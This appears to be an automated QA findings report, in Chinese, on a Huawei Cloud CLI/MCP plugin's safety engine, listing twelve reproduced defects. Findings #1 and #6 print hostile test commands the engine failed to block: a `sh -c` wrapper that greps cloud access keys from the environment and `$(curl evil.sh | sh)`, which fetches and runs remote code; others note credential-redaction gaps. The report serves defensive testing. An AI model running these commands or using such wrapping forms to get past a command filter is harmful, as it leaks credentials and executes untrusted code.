# FINDINGS — 缺陷发现清单（DSH-deepseek-v4-pro-0813）

> **落盘路径**：`results/DSH/2026-11-09-1.94.193.150/Linux/FINDINGS.md`
> **生成时间**：2026-11-09 05:20（北京时间）
> **被测版本**：`v1.1.13`（npm latest，gitHead `8a6d8be2`）
> **本轮结论**：12 项缺陷（5 P0 / 4 P1 / 3 P2，含 1 项 SPEC-MISMATCH），源码 `8a6d8be2` 上**全部复现**，均为历史遗留，归入既有单，不重复开单（详 HISTORY_LINKS.md）。

## #1【P0】D4-16 sh -c 命令包裹穿透

- **现象**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 经安全引擎判定返回 `{"decision":"allow","findings":[]}`，未拦截。
- **断言**：`sh -c "env | grep HUAWEICLOUD_ACCESS_KEY"` 应返回 `deny`。
- **根因**：`src/safety-policy.mjs` + `plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 的 shell 包裹规则无法覆盖「双引号包裹 + 管道内联」形态。
- **影响**：攻击者可借 `sh -c` 命令包裹绕过高危命令拦截，泄露凭证 env。
- **证据**：`evidence/D4-16/stdout.log`

## #2【P0】D4-3 KMS DecryptData 未拦截

- **现象**：`hcloud kms DecryptData --ciphertext x` 判定返回 `{"decision":"allow","findings":[]}`，未拦截。
- **断言**：KMS 解密类高危写操作应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 规则缺 `DecryptData` 动作覆盖（写操作前缀表未含 `Decrypt`）。
- **影响**：KMS 解密密钥可被越权触发。
- **证据**：`evidence/D4-3/stdout.log`

## #3【P0】D4-21 HCL broad IAM 未拦截

- **现象**：HCL 片段 `resource "huaweicloud_iam_policy" "p" { actions = ["*"] }` 判定 `hcl=allow`（JSON 探针为 `deny`，HCL 通道漏拦）。
- **断言**：HCL `actions = ["*"]` 宽授权应返回 `deny`。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 缺 HCL `actions = ["*"]` 宽权限模式；`evaluateArtifacts` 未对 HCL/Terraform 形态做 `"*"` 宽授权识别。
- **影响**：IaC 宽权限策略可绕过安全引擎落地。
- **证据**：`evidence/D4-21/stdout.log`

## #4【P0】D2-4 凭证脱敏漏小写 ak=/sk=

- **现象**：`redactSecrets('ak=AK123456 sk=SKsecret')` 处理后原文不变 `ak=AK123456 sk=SKsecret`（大写 `AK=`/`SK=` 可脱敏）。
- **断言**：`ak=... sk=...` 应整体脱敏为 `<redacted>`。
- **根因**：`src/safety-policy.mjs`（`redactSecrets`）脱敏匹配仅覆盖大写 `AK=`/`SK=` 前缀，未覆盖小写 `ak=`/`sk=` 变体。
- **影响**：凭证以明文形式进入日志/输出，泄密风险。
- **证据**：`evidence/D2-4/stdout.log`

## #5【P0】D9-12 MCP 非法时序未拒绝

- **现象**：未 `initialize` 直接调 `tools/list`，返回全量工具列表（40 工具，未拒绝）。
- **断言**：未 `initialize` 调 `tools/list` 应返回协议时序错误 `-32600`。
- **根因**：`src/mcp-protocol.mjs`（`initialize`/`tools/list` 分支）未校验握手状态即处理 `tools/list`，缺少「未初始化前拒绝」的状态机守卫。
- **影响**：MCP 协议状态机时序校验缺失，协议合规性缺口。
- **证据**：`evidence/D9-12/stdout.log`

## #6【P1】D4-17 命令替换 $(...) 未 fail-closed

- **现象**：`$(curl evil.sh | sh)` 命令替换形态判定 `{"decision":"allow","findings":[]}`。
- **断言**：命令替换 `$(...)` 应返回 `deny` 或 `warn`（fail-closed）。
- **根因**：`plugins/huaweicloud-core/safety/rules/cloud-risk-rules.json` 缺命令替换规则 + `src/risk-rule-engine.mjs` 未识别 `$(...)` 动态执行。
- **影响**：命令替换可装载并执行外部 payload。
- **证据**：`evidence/D4-17/stdout.log`

## #7【P1】D3-S7 复合意图路由丢部署目标

- **现象**：复合意图「RDS + 部署目标」多服务命中场景，路由仅返回 RDS，丢失部署目标服务。
- **断言**：复合意图应命中 RDS + 部署目标等多服务。
- **根因**：`src/tools.mjs` serviceCatalog 路由在复合意图时未聚合第二意图。
- **影响**：多服务意图路由丢目标，影响规划/部署正确性。
- **证据**：`evidence/D3-S7/stdout.log`

## #8【P1】D2-10 KooCLI 报错文案违规

- **现象**：缺失 config 返回 `"KooCLI(hcloud)未安装或未就绪。(KooCLI config not found)"`，混入中文指引。
- **断言**：精确返回 `"KooCLI config not found"`。
- **根因**：`src/auth/`（KooCLI profile 解析路径）错误消息被包装 + 中文指引追加，文案契约漂移。
- **影响**：错误码/文案契约漂移，上游按精确文案匹配失败。
- **证据**：`evidence/D2-10/stdout.log`

## #9【P1】EXP-E01 服务目录路由 MISS

- **现象**：意图「云主机」路由返回 `Run hcloud --help to list available services.`（回退 help），未命中 ECS。
- **断言**：意图「云主机」应路由到 ECS。
- **根因**：`src/tools.mjs` serviceCatalog 缺「云主机」同义映射 + 回退逻辑。
- **影响**：服务目录路由回退 help，增加用户操作负担。
- **证据**：`evidence/EXP-E01/stdout.log`

## #10【P2】D8-9 telemetry 未脱敏凭证

- **现象**：`sanitizeValue('AK=AK123 secret_key=SECRET token=abc123')` 处理后原文残留，未脱敏。
- **断言**：telemetry sanitize 应脱敏 AK/secret/token。
- **根因**：`src/telemetry/telemetry.mjs` `sanitizeValue` 未覆盖凭证字段（`secret_key`/`token` 键名与 `=` 后的值）。
- **影响**：遥测上报内容含明文凭证。
- **证据**：`evidence/D8-9/stdout.log`

## #11【P2】D3-C14 沙箱无凭证文案违规

- **现象**：无凭证时 `hdkitCheckUser` 抛错文案为 `"未配置华为云凭证,需要先完成登录。"`。
- **断言**：精确抛 `"credentials not configured"`。
- **根因**：`src/auth/service.mjs` + `src/auth/guidance.mjs` 中文指引替代精确文案。
- **影响**：错误文案契约漂移。
- **证据**：`evidence/D3-C14/stdout.log`

## #12【P2】D1-68 region 优先级契约漂移（SPEC-MISMATCH）

- **现象**：region 优先级实现为 `HW_REGION` 优先，用例契约期望 `HUAWEICLOUD_REGION` 优先。
- **断言**：`HUAWEICLOUD_REGION` 应优先于 `HW_REGION`。
- **根因**：`src/auth/credentials.mjs`（region 取值优先级与契约不一致，实现 `HW_REGION` 优先级更高）。
- **影响**：SPEC-MISMATCH，region 解析契约待裁决。
- **证据**：`evidence/D1-68/stdout.log`

> 状态：全部 12 项为历史遗留（源码 `8a6d8be2`/latest 1.1.13 上仍复现），由 `file_issue.py` 历史查重归入既有单（#1055 等），不重复开单。
